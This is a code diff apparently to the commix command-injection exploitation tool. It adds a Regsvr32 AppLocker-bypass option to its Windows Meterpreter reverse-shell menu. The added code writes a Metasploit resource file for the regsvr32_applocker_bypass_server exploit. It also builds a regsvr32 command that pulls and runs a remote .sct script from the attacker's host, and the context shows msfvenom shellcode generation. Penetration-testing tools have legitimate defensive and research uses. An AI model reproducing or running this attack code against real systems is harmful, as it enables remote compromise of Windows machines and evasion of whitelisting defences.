@@ -391,6 +391,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
   ---[ """ + Style.BRIGHT + Fore.BLUE + """Powershell injection attacks""" + Style.RESET_ALL + """ ]---
   Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use shellcode injection with native x86 shellcode.
   Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use TrustedSec's Magic Unicorn.
+  Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe application whitelisting bypass.
 
 commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)
 
@@ -401,6 +402,8 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
             output = "powershell_attack.rc"
           elif windows_reverse_shell == '2' :
             output = "powershell_attack.txt"
+          elif windows_reverse_shell == '3' :
+            output = "regsvr32_applocker_bypass_server.rc"
           else:
             err_msg = "The '" + windows_reverse_shell + "' option, is not valid."  
             print settings.print_error_msg(err_msg)
@@ -413,11 +416,12 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
 
           payload = "windows/meterpreter/reverse_tcp"
           # Define standard metasploit payload
-          info_msg = "Generating the '" + payload + "' shellcode... "
-          sys.stdout.write(settings.print_info_msg(info_msg))
-          sys.stdout.flush()
+          if windows_reverse_shell != '3':
+            info_msg = "Generating the '" + payload + "' shellcode... "
+            sys.stdout.write(settings.print_info_msg(info_msg))
+            sys.stdout.flush()
 
-          # TrustedSec's Magic Unicorn (3rd Party)
+          # Shellcode injection with native x86 shellcode
           if windows_reverse_shell == '1':
             try:
               proc = subprocess.Popen("msfvenom -p " + str(payload) + " LHOST=" + str(settings.LHOST) + " LPORT=" + str(settings.LPORT) + " -f c -o " + output + ">/dev/null 2>&1", shell=True).wait()
@@ -440,6 +444,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
               print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
             break
 
+          # TrustedSec's Magic Unicorn (3rd Party)
           elif windows_reverse_shell == '2':
             try:
               current_path = os.getcwd()
@@ -463,6 +468,24 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
             except:
               print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
             break
+
+          # Regsvr32.exe application whitelisting bypass
+          elif windows_reverse_shell == '3':
+            with open(output, 'w+') as filewrite:
+              filewrite.write("use exploit/windows/misc/regsvr32_applocker_bypass_server\n"
+                              "set payload " + payload + "\n"
+                              "set lhost " + str(settings.LHOST) + "\n"
+                              "set lport " + str(settings.LPORT) + "\n"
+                              "set srvport " + str(settings.SRVPORT) + "\n"
+                              "set uripath " + settings.URIPATH + "\n"
+                              "exploit\n\n")
+            if not settings.TARGET_OS == "win":
+              windows_only_attack_vector()
+              continue
+            else:
+              other_shell = "regsvr32 /s /n /u /i:http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH +".sct scrobj.dll"
+              msf_launch_msg(output)
+              break
       break
     
     # Web delivery script
